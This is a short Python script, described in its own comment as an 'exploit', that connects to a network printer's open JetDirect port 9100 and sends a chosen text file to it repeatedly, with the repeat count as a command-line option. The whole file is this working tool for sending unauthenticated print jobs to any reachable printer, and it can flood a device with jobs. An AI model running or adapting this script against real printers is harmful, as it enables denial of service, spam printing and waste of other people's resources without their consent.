import socket
import optparse
'''
After playing around with netcat a little and connecitng to the
printer. I found after conducing an nmap scan: 9100/tcp open  jetdirect.
I fiddled around once I nc to the port and typed in ls 
													 h
And to my suprise it actually printed those exact items out so from here
I figured that I could potentially devise a script that could allow anyone to
connect to a printer and send print jobs to it.  This exploit does exactly that.
'''

def connectToPrinter(printerIP, portNum):
	print('[+] Connection Established Successfully with Printer!')
	connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connection.connect((printerIP, portNum))
	return connection 

def convertFile(file):
	print('[+] Converting File to text format')
	text = ''
	with open(file) as f:
		for line in f:
			text += line
	return text

def sendData(connection, data):
	print('[+] Sending Data to Printer ...')
	connection.send(data.encode())
	print('[+] Print Job Successfully Initiated')

def main():
	command = optparse.OptionParser()
	command.add_option('-t', action='store', dest='target', type='string', help='specify the target printer')
	command.add_option('-f', action='store', dest='file', type='string', help='specify the path to the file you want to send')
	command.add_option('-p', action='store', dest='port' , type='int', help='specify the port number')
	command.add_option('-c', action='store', dest='count', type='int', help='specify the number of tiems you would like to send the data to the printer')
	(options, args) = command.parse_args()
	ip_addr = options.target
	file = options.file
	port_num = options.port
	num = options.count
	connection = connectToPrinter(ip_addr, port_num)
	printingData = convertFile(file)
	
	for _ in range(num):
		sendData(connection, printingData)

	print('[+] Program Complete!')

if __name__ == "__main__":
	main()